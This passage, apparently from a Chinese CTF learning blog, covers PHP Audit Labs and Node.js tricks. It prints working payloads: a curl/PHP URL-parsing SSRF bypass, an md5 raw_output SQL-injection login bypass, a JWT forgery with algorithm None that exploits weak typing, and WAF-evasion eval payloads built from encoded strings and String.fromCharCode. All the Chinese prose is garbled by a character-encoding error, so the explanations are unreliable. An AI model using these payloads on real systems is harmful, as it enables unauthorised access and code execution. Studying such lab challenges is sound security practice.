class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// flag.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (! function_exists(<span class="string">'real_ip'</span>) ) &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">real_ip</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $ip = $_SERVER[<span class="string">'REMOTE_ADDR'</span>];</span><br><span class="line">        <span class="keyword">if</span> (is_null($ip) &amp;&amp; <span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>]) &amp;&amp; preg_match_all(<span class="string">'#\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;#s'</span>, $_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>], $matches)) &#123;</span><br><span class="line">            <span class="keyword">foreach</span> ($matches[<span class="number">0</span>] <span class="keyword">AS</span> $xip) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!preg_match(<span class="string">'#^(10|172\.16|192\.168)\.#'</span>, $xip)) &#123;</span><br><span class="line">                    $ip = $xip;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (is_null($ip) &amp;&amp; <span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_CLIENT_IP'</span>]) &amp;&amp; preg_match(<span class="string">'/^([0-9]&#123;1,3&#125;\.)&#123;3&#125;[0-9]&#123;1,3&#125;$/'</span>, $_SERVER[<span class="string">'HTTP_CLIENT_IP'</span>])) &#123;</span><br><span class="line">            $ip = $_SERVER[<span class="string">'HTTP_CLIENT_IP'</span>];</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (is_null($ip) &amp;&amp; <span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_CF_CONNECTING_IP'</span>]) &amp;&amp; preg_match(<span class="string">'/^([0-9]&#123;1,3&#125;\.)&#123;3&#125;[0-9]&#123;1,3&#125;$/'</span>, $_SERVER[<span class="string">'HTTP_CF_CONNECTING_IP'</span>])) &#123;</span><br><span class="line">            $ip = $_SERVER[<span class="string">'HTTP_CF_CONNECTING_IP'</span>];</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (is_null($ip) &amp;&amp; <span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_X_REAL_IP'</span>]) &amp;&amp; preg_match(<span class="string">'/^([0-9]&#123;1,3&#125;\.)&#123;3&#125;[0-9]&#123;1,3&#125;$/'</span>, $_SERVER[<span class="string">'HTTP_X_REAL_IP'</span>])) &#123;</span><br><span class="line">            $ip = $_SERVER[<span class="string">'HTTP_X_REAL_IP'</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $ip;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$rip = real_ip();</span><br><span class="line"><span class="keyword">if</span>($rip === <span class="string">"127.0.0.1"</span>)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"HRCTF&#123;SSRF_can_give_you_flag&#125;"</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"You IP is &#123;$rip&#125; not 127.0.0.1"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™ä¸ªåº”è¯¥å°±æ˜¯å½“åˆéƒå¸ˆå‚…ç»å…¸ssrfçš„åŸå‹äº†ã€‚è¦æ±‚ä»å†…ç½‘ip 127.0.0.1è®¿é—®flag.phpæ‰èƒ½å¾—åˆ°flag.ä½¿ç”¨çš„è‡ªç„¶æ˜¯å½“åˆblackhatpdfä¸­åˆ†äº«çš„å…³äºphpåŠcurlé—´å¯¹urlè§£æçš„å·®å¼‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url&#x3D;http:&#x2F;&#x2F;foo@localhost:80@www.bycsec.top&#x2F;flag.php</span><br></pre></td></tr></table></figure><p>libcurlè®¤ç¬¬ä¸€ä¸ª<code>@</code>åçš„ä½œä¸ºhostã€‚phpåŠå…¶ä»–è¯­è¨€éƒ½è®¤æœ€åä¸€ä¸ª<code>@</code>åçš„ä½œä¸ºhost.æ‰€ä»¥å‰é¢ç»•è¿‡å†…ç½‘ipé™åˆ¶ã€‚åœ¨åé¢æˆåŠŸæ‰§è¡Œäº†curl</p><h2 id="Day17"><a href="#Day17" class="headerlink" title="Day17"></a>Day17</h2><p><img src="/2020/04/27/PHP-Audit-Labs%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/18.png" class="lazyload" data-srcset="18.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><h2 id="md5-raw-output-true"><a href="#md5-raw-output-true" class="headerlink" title="md5 raw_output = true"></a>md5 raw_output = true</h2><p>è¿™å…¶å®æ˜¯ä¸€ä¸ªå¾ˆç»å…¸çš„æ¼æ´ =&gt; å¦‚æœæåˆ° ffifdyopåº”è¯¥å°±å¾ˆç†Ÿæ‚‰äº†ã€‚ä¼ è¯´ä¸­çš„ä¸‡èƒ½å¯†ç ç»•è¿‡ã€‚ è€Œä¹‹æ‰€ä»¥å­˜åœ¨è¿™ä¸ªç»•è¿‡çš„åŸå› æ˜¯md5è¿™ä¸ªå‡½æ•°ç¬¬äºŒä¸ªé€‰é¡¹å°±æ˜¯<code>raw_output</code>ã€‚é»˜è®¤ä¸ºfalseã€‚ä½†æ˜¯å‡å¦‚è®¾ä¸ºtrueçš„è¯MD5æŠ¥æ–‡æ‘˜è¦å°†ä»¥16å­—èŠ‚é•¿åº¦çš„åŸå§‹äºŒè¿›åˆ¶æ ¼å¼è¿”å›ã€‚è¿™æ ·å°±ä¼šå­˜åœ¨ä¸€äº›å¥‡æ€ªçš„å­—ç¬¦ã€‚å› æ­¤ ffifdyop åœ¨ç»è¿‡md5åçš„å†…å®¹æ°å¥½æ˜¯<code>&#39;or&#39;6\xc9]\x99</code>.ç¬¦åˆä¸‡èƒ½å¯†ç çš„è¦æ±‚ã€‚</p><p>æœ¬é¢˜ä¹Ÿæ˜¯åŒæ ·çš„é“ç†ã€‚<code>addslashes</code>çœ‹ä¼¼ä¸èƒ½ç»•è¿‡ã€‚ä½†æ˜¯å› ä¸ºæ‹¼æ¥çš„æ˜¯md5åçš„pass.æ‰€ä»¥åªè¦æ‰¾åˆ°ä¸€ä¸ªæ•°å­—md5åçš„rawå†…å®¹åŒ…å«<code>\</code>å³å¯ã€‚</p><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user&#x3D; OR 1&#x3D;1#&amp;passwd&#x3D;128</span><br></pre></td></tr></table></figure><h2 id="summary"><a href="#summary" class="headerlink" title="summary"></a>summary</h2><p>æ—¶éš”ä¸¤ä¸ªæœˆç»ˆäºåˆæŠŠauditlabsçš„å‘å¡«å®Œäº†â€¦â€¦ ä¸å¾—ä¸è¯´é‡Œé¢æ¶µç›–çš„å¾ˆå¤šphpç›¸å…³æ¼æ´éƒ½æ˜¯äº›æ–°æ‰‹åˆšåˆšå…¥é—¨å¹³å°é‡Œçš„é‚£äº›ç»å…¸é¢˜ç›®çš„åŸç†ã€‚å½“åˆæœ‰çš„åŠæ‡‚ä¸æ‡‚ï¼Œç°åœ¨ç®—æ˜¯æŠŠå‘ç»™å¡«ä¸Šäº†ã€‚</p><p>ç„¶åè‡ªå·±æœ€è¿‘æœ‰äº›çº ç»“ã€‚åŸæœ¬å› ä¸ºæ¥è§¦äº†ä¸€äº›å›½é™…èµ›åï¼Œå¼€å§‹æŠ•èº«nodejsä¸pythonç›¸å…³çš„æ¼æ´äº†ã€‚å‡ºäº†å‡ é“é¢˜ä¹Ÿéƒ½åªæ˜¯nodeè·Ÿpython.å”¯ä¸€ä¸€é“phpè¿˜æ˜¯sqlæ³¨å…¥ã€‚å¯èƒ½è‡ªå·±å¿ƒé‡Œå¯¹phpè¿˜æ˜¯è°ˆä¸ä¸Šå–œæ¬¢å§ï¼Œæ²¡æœ‰é’»ç ”ç»†èŠ‚çš„åŠ²å¤´ï¼Œæ›´æ²¡æœ‰è¿›è¡Œç›¸å…³å¼€å‘çš„æƒ³æ³•ã€‚ä½†æœ€è¿‘å¤´ä¸€æ¬¡å®æˆ˜å‘ç°phpä»æ—§æ˜¯ç½‘ç«™å¤§å¤´ä¹‹ä¸€,å¹¶ä¸”ctfæ¯”èµ›ä¸­phpè¿˜æ˜¯æœ‰ç€èƒ½å¤Ÿéš¾å€’äººçš„ç»å¯¹æ°´å‡†ã€‚å‡å¦‚æˆ‘æƒ³è¦ç»§ç»­æå‡å®åŠ›ï¼Œä»æ—§å¾—åœ¨phpä¸‹ä¸‹ä¸å°‘åŠŸå¤«ã€‚æ›´ä½•å†µçœ‹æ¡†æ¶çš„æ´å·²ç»ç®—æœ€è¿‘çš„ä¸€å¤§ä¹è¶£äº†233.</p><p>æ‰€ä»¥è¯´,å¸Œæœ›è‡ªå·±è¿˜æ˜¯èƒ½èŠ±ç‚¹æ—¶é—´å»å¤šçœ‹çœ‹php.æ‰¾æ—¶é—´ç»ƒç»ƒæ‰‹ã€‚æœ€åèƒ½å¤šå‡ºå‡ ä¸ªé¢˜å°±å¥½äº†ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> WEB </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å­¦ä¹ ç¬”è®°-Nodejsç›¸å…³</title>
      <link href="2020/04/20/Nodejs%E7%9A%84%E4%B8%80%E4%BA%9B%E6%8A%80%E5%B7%A7/"/>
      <url>2020/04/20/Nodejs%E7%9A%84%E4%B8%80%E4%BA%9B%E6%8A%80%E5%B7%A7/</url>
      
        <content type="html"><![CDATA[<p>æ‰“ç®—å†™å†™Nodeé‡Œé¢æœ€è¿‘é‡åˆ°çš„çŸ¥è¯†äº†ã€‚<br>ä¸»è¦è¿˜æ˜¯è·Ÿå‘¨æœ«çš„è™ç¬¦æœ‰å…³å§ã€‚ä½œä¸ºäºŒé˜Ÿæ‰“çš„,å­¦æ ¡è™½å¦‚æœŸè¿›å…¥çº¿ä¸‹,ä½†æ˜¯è‡ªå·±è¿™æ¬¡è¿˜æ˜¯æœ‰ç‚¹å°éš¾å—ã€‚åˆ·äº†è¿™ä¹ˆå¤šé¢˜äº†,ç»“æœç¢°åˆ°ä¸¤é“å¹¶ä¸ç®—æ“…é•¿çš„Nodeé¢˜ç›®ã€‚åªåšå‡ºæ¥ç¬¬ä¸€é“é¢˜ã€‚åè¡€çš„æ˜¯ç¬¬äºŒé¢˜å½“æ—¶å¾ˆæ¸…æ¥šè‚¯å®šæ˜¯Node.jsæ²™ç›’é€ƒé€¸ï¼Œä¹ŸæŒ‰ç…§å¤§è‡´æµç¨‹æ„é€ äº†payloadï¼Œç»“æœå°±æ˜¯æ‰“ä¸é€šã€‚èµ›ååŒæ ·çš„payloadä¸Šbuuä¸€è¯•ç¬é—´æˆåŠŸæ‰§è¡Œï¼Œå¿ƒæ€ç‚¸è£‚ã€‚<br>è€å®è¯´Nodeé¢˜ä¹Ÿç®—åšäº†ä¸å°‘æ¬¡äº†,ç›¸å…³çš„æ¼æ´é™¤äº†åŸå‹é“¾æ¯”è¾ƒç†Ÿæ‚‰å…¶ä»–çš„éƒ½ä¸æ€ä¹ˆäº†è§£ã€‚æ‰“ç®—è¿‘æœŸä¸€æ–¹é¢æŠŠç›¸å…³çš„é¢˜ç›®å¤šçœ‹ä¸‹ï¼Œç„¶åå°±æ˜¯åŸºç¡€è¯­æ³•å·©å›ºä¸‹ï¼Œå¹¶ä¸”æ€»ç»“å‡ ä¸ªé‡åˆ°çš„æœ‰ç”¨çš„trick.</p><a id="more"></a><h2 id="å¼±ç±»å‹"><a href="#å¼±ç±»å‹" class="headerlink" title="å¼±ç±»å‹"></a>å¼±ç±»å‹</h2><p>Node.jsä½¿ç”¨çš„æ˜¯javascriptçš„è¯­æ³•ã€‚ç®€å•çš„è¯´ Node.js å°±æ˜¯è¿è¡Œåœ¨æœåŠ¡ç«¯çš„ JavaScriptã€‚æ¯«æ— ç–‘é—®ä½œä¸ºå¼±ç±»å‹çš„javascriptè‡ªç„¶ä¼šæŠŠè¿™ç§ç‰¹æ€§å¸¦åˆ°æœåŠ¡ç«¯,äº§ç”Ÿä¸€äº›å¥‡æ€ªçš„æ•ˆç”¨ã€‚</p><p>ç®€å•çš„å¼±ç±»å‹çš„ä¾‹å­</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a =<span class="number">200</span>;</span><br><span class="line"><span class="keyword">var</span> b =<span class="string">"1"</span>;</span><br><span class="line"><span class="keyword">var</span> c= a + b;</span><br><span class="line"><span class="built_in">console</span>.log(c);</span><br><span class="line"></span><br><span class="line"><span class="comment">//2001</span></span><br></pre></td></tr></table></figure><p>å­—ç¬¦ä¸²ä¸æ•°å­—ç»ç”±ä¸€ä¸ªäºŒå…ƒè¿ç®—ç¬¦æœ€åè¿”å›çš„æ˜¯æ•°å­—ç±»å‹ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;<span class="attr">name</span>:<span class="string">'jack'</span>&#125;</span><br><span class="line"><span class="keyword">if</span>(obj)&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯¹è±¡å¯ä»¥è½¬åŒ–ä¸ºå¸ƒå°”å€¼ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">String</span>.prototype.fn = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">return</span> <span class="keyword">this</span>&#125;;</span><br><span class="line"><span class="keyword">var</span> a = <span class="string">'hello'</span>;</span><br><span class="line">alert(<span class="keyword">typeof</span> a.fn());</span><br><span class="line">alert(a.fn());</span><br></pre></td></tr></table></figure><p>æœ¬è¯¥è¿”å›å¯¹è±¡çš„å‡½æ•°a.fn()éšå¼çš„è½¬æ¢æˆäº†å­—ç¬¦ä¸²â€œhelloâ€æ˜¾ç¤º.</p><p>è¿™æ ·å°±å¯ä»¥å€Ÿç”±è™ç¬¦ç¬¬ä¸€ä¸ªeasy_loginçš„é¢˜ç›®æ¥æ¢è®¨ä¸‹nodejsçš„å¼±ç±»å‹äº†ã€‚</p><p>è¿™é“é¢˜ä¸å‡ºæ„å¤–åº”è¯¥æ˜¯æŒ‰ç…§<a href="https://github.com/justcatthefish/ctf/tree/master/2019-04-25-Angstrom2019/web#cookie-cutter" target="_blank" rel="noopener">https://github.com/justcatthefish/ctf/tree/master/2019-04-25-Angstrom2019/web#cookie-cutter</a> è¿™ä¸ªæ”¹çš„ã€‚åŸé¢˜è·Ÿæ­¤å¤„çš„æ ¡éªŒå‡ ä¹ä¸€æ ·ã€‚é‚£æˆ‘ä»¬æ¥çœ‹çœ‹è™ç¬¦è¿™é¢˜çš„å…³é”®æ ¡éªŒä»£ç ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">const</span> sid = <span class="built_in">JSON</span>.parse(Buffer.from(token.split(<span class="string">'.'</span>)[<span class="number">1</span>], <span class="string">'base64'</span>).toString()).secretid;</span><br><span class="line"><span class="built_in">console</span>.log(sid)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(sid === <span class="literal">undefined</span> || sid === <span class="literal">null</span> || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;= <span class="number">0</span>)) &#123;</span><br><span class="line">   <span class="keyword">throw</span> <span class="keyword">new</span> APIError(<span class="string">'login error'</span>, <span class="string">'no such secret id'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> secret = global.secrets[sid];</span><br><span class="line"><span class="keyword">const</span> user = jwt.verify(token, secret, &#123;<span class="attr">algorithm</span>: <span class="string">'HS256'</span>&#125;);</span><br></pre></td></tr></table></figure><p>å»çœ‹åŸé¢˜å°±èƒ½å­¦åˆ°å§¿åŠ¿ï¼šç”±äºsidæ˜¯è·Ÿæ®ç¬¬äºŒä¸ªâ€™.â€™çš„å†…å®¹å–å‡ºæ¥çš„,å¦‚æœç¨å¾®è®¾è®¡ä¸€ä¸‹ï¼Œæ¯”å¦‚ä»¤å€¼ä¸ºçº¯ä»»æ„å­—æ¯å­—ç¬¦ä¸²ï¼Œå°±èƒ½è¿‡é‚£ä¸ªifçš„åˆ¤æ–­å¹¶ä½¿secrets[sid]è¿”å›undefined.<br>è¿™æ ·é…åˆä¸Šå‰é¢æˆ‘ä»¬ç½®ä¸ºNoneçš„åŠ å¯†æ–¹å¼,å³å¯åœ¨jwt.verifyæ—¶æˆåŠŸè§£ç ã€‚</p><p>æœ¬é¢˜è·ŸåŸé¢˜æœ‰ä¸€ä¸ç‚¹çš„åŒºåˆ«ï¼š<code>!(sid &lt; global.secrets.length &amp;&amp; sid &gt;= 0))</code>è¿™æ®µä»£ç çœ‹ä¼¼é™åˆ¶äº†æˆ‘ä»¬åªèƒ½ä¼ æœ‰æ•ˆçš„æ•°ç»„é”®å€¼å³æ•°å­—,ä½†æ˜¯æ•°å­—å­—ç¬¦ä¸²ä¾æ—§æœ‰æ•ˆ</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">global.secrets=[<span class="string">'supersecretkeyyouwillneverknow'</span>,<span class="string">'2333333'</span>];</span><br><span class="line"><span class="keyword">const</span> sid=<span class="string">"00"</span>;</span><br><span class="line"><span class="built_in">console</span>.log(sid);</span><br><span class="line"><span class="built_in">console</span>.log(global.secrets.length);</span><br><span class="line"><span class="keyword">if</span>(sid === <span class="literal">undefined</span> || sid === <span class="literal">null</span> || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;= <span class="number">0</span>)) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"no"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> secret = global.secrets[sid];</span><br><span class="line"><span class="built_in">console</span>.log(secret);</span><br></pre></td></tr></table></figure><p>å‡è®¾è¿™æ˜¯æˆ‘ä»¬å·²ç»æ³¨å†Œè¿‡2ä¸ªç”¨æˆ·çš„æƒ…å†µã€‚ç°åœ¨çœ‹çœ‹æ‰§è¡Œç»“æœ<br><img src="/2020/04/20/Nodejs%E7%9A%84%E4%B8%80%E4%BA%9B%E6%8A%80%E5%B7%A7/0.PNG" class="lazyload" data-srcset="0.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>æ²¡æœ‰æŠ¥é”™ã€‚è¯´æ˜æ­£å¦‚æˆ‘ä»¬æ‰€æ–™,è¿›è¡Œ&gt;æˆ–è€…&gt;=è¿™ä¸¤ä¸ªè¿ç®—ç¬¦åå­—ç¬¦ä¸²sidè¢«è½¬æ¢æˆäº†æ•°å€¼ç±»å‹å³ 0(number) 0&lt;1 &amp;&amp; 0&gt;=0<br>åŒæ—¶ä¸‹é¢çš„æ•°ç»„é”®å€¼ä¸å­˜åœ¨,å³secrets[â€œ00â€]ä¸å­˜åœ¨ã€‚<br>æ‰€ä»¥è¿™é¢˜å¯ä»¥æ³¨å†Œnä¸ªç”¨æˆ·,(è‡³å°‘è¦æœ‰ä¸€ä¸ª),ç„¶åä¼ ä¸ªå°äºé•¿åº¦çš„æ•°å­—å­—ç¬¦ä¸²å°±è¡Œã€‚</p><p>å†ç®€å•ä¸€ç‚¹çš„,ç›´æ¥ä¼ ä¸€ä¸ªç©ºå­—ç¬¦ä¸²å½“ç„¶ä¹Ÿæ˜¯å¯ä»¥çš„ã€‚<br>ç©ºæ•°ç»„ä¹Ÿæ˜¯åŒæ ·çš„é“ç†ã€‚ä¸”æ•°ç»„å¦‚æœä¼ å…ƒç´ çš„è¯ä¹Ÿä¼šéµå¾ªè·Ÿä¸Šé¢å­—ç¬¦ä¸²ä¸€æ ·çš„è½¬åŒ–è§„å¾‹<br>æœ€ååŠ å¯†å³å¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line">payload = &#123;<span class="string">'secretid'</span>: <span class="string">"00"</span>, <span class="string">'username'</span>: <span class="string">'admin'</span>, <span class="string">'password'</span>: <span class="string">'123'</span>&#125;</span><br><span class="line">print(jwt.encode(payload, <span class="string">''</span>, algorithm=<span class="literal">None</span>))</span><br></pre></td></tr></table></figure><p>å€¼å¾—ä¸€æçš„æ˜¯,çº¯å­—æ¯å­—ç¬¦ä¸²ä¸æ•°å­—æ¯”è¾ƒæ—¢ä¸æ»¡è¶³å¤§äºç­‰äºä¹Ÿä¸æ»¡è¶³å°äºç­‰äºï¼Œè¿™ä¹Ÿæ˜¯å›½é™…èµ›åŸé¢˜çš„å°æŠ€å·§ã€‚</p><h2 id="ä½¿ç”¨ç¼–ç -æ¨¡æ¿å­—ç¬¦-æ•°ç»„ç­‰ç»•è¿‡waf"><a href="#ä½¿ç”¨ç¼–ç -æ¨¡æ¿å­—ç¬¦-æ•°ç»„ç­‰ç»•è¿‡waf" class="headerlink" title="ä½¿ç”¨ç¼–ç \æ¨¡æ¿å­—ç¬¦\æ•°ç»„ç­‰ç»•è¿‡waf"></a>ä½¿ç”¨ç¼–ç \æ¨¡æ¿å­—ç¬¦\æ•°ç»„ç­‰ç»•è¿‡waf</h2><p>Node.jsåœ¨ç¼–ç ä¸Šä¹Ÿæœ‰è®¸å¤šå¯ä»¥ç»•è¿‡çš„æŠ€å·§<br>å¸¸è§çš„æ¯”å¦‚å…«è¿›åˆ¶,16è¿›åˆ¶,unicode</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"constructor"</span></span><br><span class="line"><span class="comment">//oct</span></span><br><span class="line"><span class="string">"\143\157\156\163\164\162\165\143\164\157\162"</span></span><br><span class="line"><span class="comment">//hex</span></span><br><span class="line"><span class="string">"\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72"</span></span><br><span class="line"><span class="comment">//unicode</span></span><br><span class="line"><span class="string">"\u0063\u006f\u006e\u0073\u0074\u0072\u0075\u0063\u0074\u006f\u0072"</span></span><br></pre></td></tr></table></figure><p>å‡å¦‚æƒ³è°ƒç”¨å‘½ä»¤</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[][&#39;constructor&#39;][&#39;constructor&#39;](&#39;alert(12345)&#39;)()</span><br><span class="line">[].constructor.constructor(&#39;alert(12345)&#39;)()</span><br><span class="line">Array.constructor(&#39;alert(12345)&#39;)()</span><br></pre></td></tr></table></figure><p>//ä¸Šé¢ä¸‰ç§å†™æ³•æ˜¯ç­‰ä»·çš„.ä¹‹å‰å…¬ç›Šèµ›NodeGameä¹Ÿæåˆ°è¿‡ã€‚<br><img src="/2020/04/20/Nodejs%E7%9A%84%E4%B8%80%E4%BA%9B%E6%8A%80%E5%B7%A7/1.PNG" class="lazyload" data-srcset="1.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>ä½†æ˜¯è¦æ³¨æ„ä¸€ç‚¹ã€‚è¿™é‡Œå…¶ä»–è¿›åˆ¶ä»¥åŠunicodeæƒ³è¦æˆåŠŸè¢«è§£ææˆå­—ç¬¦ä¸²è¿˜æ˜¯å¾—è¦å•æˆ–åŒå¼•å·ã€‚å¦åˆ™æ— æ³•æˆåŠŸæ‰§è¡Œã€‚é‚£ä¹ˆé‡åˆ°è¿‡æ»¤äº†å•åŒå¼•å·çš„wafæ€ä¹ˆåŠå‘¢ï¼Ÿ</p><p>è¿™é‡Œå†ç»™å‡ºä¸€ç§æ–¹æ³•ã€‚æ¯”å¦‚è¿™æ¬¡è™ç¬¦just_escapeæˆ‘ä½¿ç”¨çš„ç»•è¿‡wafçš„payloadï¼š<code>\u0065val(String.fromCharCode(116,114,121,123,10,32,32,32,32,32,32......))</code></p><p>unicodeçš„ç»•è¿‡ä¸å¿…å¤šè¯´åé¢å­—ç¬¦ä¸²ä½¿ç”¨String.fromCharCodeä¹Ÿæ˜¯xssä¸­ç»å¸¸ç”¨åˆ°çš„æŠ€å·§äº†ã€‚<br>å°±æ˜¯è¿™ä¸ªpayloadåœ¨icqæ‰“ä¸é€šâ€¦buuå¯è¡Œã€‚ä¸ç„¶æˆ‘å·®ç‚¹æ€€ç–‘æ–¹æ³•æ„é€ æœ‰é—®é¢˜äº†â€¦éš¾å—</p><p>è¿˜æœ‰ä¸€ç§æ–¹æ³•æ˜¯ä»èµµå¸ˆå‚…é‚£é‡Œå­¦æ¥çš„æ¨¡æ¿å­—ç¬¦ä¸²çš„æ–¹æ³•,å…¶å®è‡ªå·±ä¹‹å‰ä¹Ÿç”¨è¿‡,å°±æ˜¯æ²¡æ·±åˆ»ç†è§£ã€‚</p><p>ç®€å•æ¥ç”¨å°±æ˜¯ç”¨åå¼•å·ä»£æ›¿åŒå¼•å·.æ‰€ä»¥ä¸Šé¢è¯´åªæœ‰å•åŒå¼•å·æ‰èƒ½è§£æè¿›åˆ¶æ˜¯é”™è¯¯çš„ã€‚<br><img src="/2020/04/20/Nodejs%E7%9A%84%E4%B8%80%E4%BA%9B%E6%8A%80%E5%B7%A7/2.PNG" class="lazyload" data-srcset="2.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>ä½†æ˜¯ç»å®éªŒåå‘ç°,åªæœ‰å…«è¿›åˆ¶ä¼šåœ¨è¢«åå¼•å·åµŒå¥—æ—¶å‡ºç°æŠ¥é”™ã€‚è¿™ç‚¹æš‚æ—¶æ²¡æ‰¾åˆ°åŸå› ,æˆ‘çŒœæµ‹å¯èƒ½è·Ÿå…«è¿›åˆ¶è¿‡äºç®€ä¾¿çš„å†™æ³•æœ‰å…³å§ã€‚<br>(jsè¯­æ³•ä¸­åªè¦â€\143â€è¿™ç§å†™æ³•å°±é»˜è®¤ä¸ºå…«è¿›åˆ¶,æœ€å¤§ä¸ºâ€\377â€)</p><p>è€Œæ¨¡æ¿å­—ç¬¦ä¸²çš„å†™æ³•å…è®¸æˆ‘ä»¬è¿›è¡Œå­—ç¬¦æ‹¼æ¥<br><img 